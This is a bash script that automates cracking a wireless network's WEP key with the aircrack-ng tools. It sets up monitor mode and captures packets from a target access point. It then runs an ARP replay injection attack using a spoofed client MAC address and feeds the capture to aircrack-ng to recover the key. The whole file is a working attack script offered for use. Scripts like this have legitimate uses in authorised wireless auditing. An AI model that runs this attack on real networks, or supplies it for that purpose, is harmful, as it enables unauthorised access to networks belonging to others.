#!/bin/bash

echo "=== WEP Cracking Automation Script ==="

read -p "Enter the wireless interface (e.g., wlan0): " iface
airmon-ng start "$iface"

read -p "Enter the monitor interface (e.g., mon0): " mon
airodump-ng "$mon"

read -p "Enter the target AP MAC address: " ap_mac
read -p "Enter the target AP channel: " channel
read -p "Enter your MAC address (for injection spoofing): " client_mac

echo "[*] Starting focused packet capture on channel $channel..."
airodump-ng -c "$channel" --bssid "$ap_mac" -w wepcrack "$mon" &
airodump_pid=$!

sleep 5
echo "[*] Starting ARP request replay attack..."
aireplay-ng -3 -b "$ap_mac" -h "$client_mac" "$mon"

echo "[*] Terminating airodump capture..."
kill "$airodump_pid"
sleep 2

echo "[*] Attempting to crack WEP key..."
aircrack-ng wepcrack-01.cap
